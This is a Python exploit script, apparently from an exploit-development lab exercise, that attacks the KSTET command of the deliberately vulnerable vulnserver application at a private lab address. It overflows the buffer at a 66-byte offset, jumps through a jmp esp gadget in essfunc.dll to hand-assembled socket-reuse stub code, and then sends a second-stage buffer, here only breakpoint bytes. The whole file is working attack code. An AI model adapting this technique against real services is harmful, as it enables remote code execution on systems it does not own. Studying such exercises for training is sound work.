#!/usr/bin/env python3

from socket import socket, AF_INET, SOCK_STREAM, timeout, error
from struct import pack
from time import sleep
from sys import exit

# CONSTANTS
rhost = "192.168.41.128"
rport = 9999
target = (rhost, rport)
timeout_val = 10  # seconds

# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 5000 -q 41326341
# [*] Exact match at offset 66
exploit = (
    b"\x90"
    b"\x54"                     # PUSH ESP
    b"\x59"                     # POP ECX
    b"\x66\x81\xC1\x88\x01"     # ADD CX,188
    b"\x83\xEC\x50"             # SUB ESP, 50
    b"\x33\xD2"                 # XOR EDX,EDX
    b"\x52"                     # PUSH EDX
    b"\x80\xC6\x02"             # ADD DH,2
    b"\x52"                     # PUSH EDX
    b"\x54"                     # PUSH ESP
    b"\x5A"                     # POP EDX
    b"\x83\xC2\x50"             # ADD EDX, 50
    b"\x52"                     # PUSH EDX
    b"\xFF\x31"                 # PUSH DWORD PTR DS:[ECX]
    b"\xB8\x11\x2C\x25\x40"     # MOV EAX, 40252C11
    b"\xC1\xE8\x08"             # SHR EAX, 8
    b"\xFF\xD0"                 # CALL EAX
)
exploit += b"\x90" * (66 - len(exploit))
# Message=  0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll]
# ASLR: False, Rebase: False, SafeSEH: False, OS: True, v-1.0-
# \\vmware-host\Shared Folders\WindowsVMs\VulnerableApps\vulnserver\essfunc.dll
exploit += pack("<L", 0x62501203)
# 00B7FA0C  ^EB B8            JMP SHORT 00B7F9C6
# JMP -72 (decimal) bytes
exploit += b"\xEB\xB8"
exploit += b"\x90" * 18

payload = b"KSTET /.:/"
payload += exploit

if __name__ == '__main__':
    print('[*] creating the socket')
    s = socket(AF_INET, SOCK_STREAM)
    s.settimeout(timeout_val)
    try:
        print('[*] connecting to the target')
        s.connect(target)
        print('[*] sending exploit')
        s.send(payload)
        print('[*] sending out payload value')
        sleep(1)
        s.send(b"\xCC" * 512)
        print('[*] cleaning up')
        s.close()
    except timeout:
        print('[!] socket timeout occurred, have you tried:')
        print('\t* ensure the debugger is not in a paused state')
        print('\t* checking if the VM is connected to the right virt network?')
        exit(1)
    except error:
        print('[!] a socket error occurred, is the host up?')
        exit(1)
    except KeyboardInterrupt:
        print()  # drop us below the ^C
        print('[!] user initiated cancel, exiting...')
        exit(1)
